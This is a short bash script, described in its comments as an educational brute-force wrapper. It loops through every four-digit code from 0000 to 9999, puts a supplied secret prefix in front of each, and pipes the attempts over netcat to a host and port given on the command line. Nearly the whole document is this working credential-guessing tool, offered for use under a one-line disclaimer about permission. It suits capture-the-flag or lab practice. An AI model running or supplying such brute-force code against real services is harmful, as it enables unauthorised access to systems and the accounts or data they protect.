#!/usr/bin/env bash

# Example bruteforce wrapper (educational). Use responsibly and only against systems you own or have permission to test.
# Usage: ./bruteforce_example.sh <target_host> <port> <secret_prefix>
#
# NOTE: This is a harmless example that demonstrates piping attempts to nc. Replace with legal targets only.

if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <host> <port> <secret_prefix>"
  exit 1
fi

HOST="$1"
PORT="$2"
SECRET_PREFIX="$3"

for i in $(seq -w 0000 9999); do
  echo "${SECRET_PREFIX} ${i}"
done | nc "${HOST}" "${PORT}"
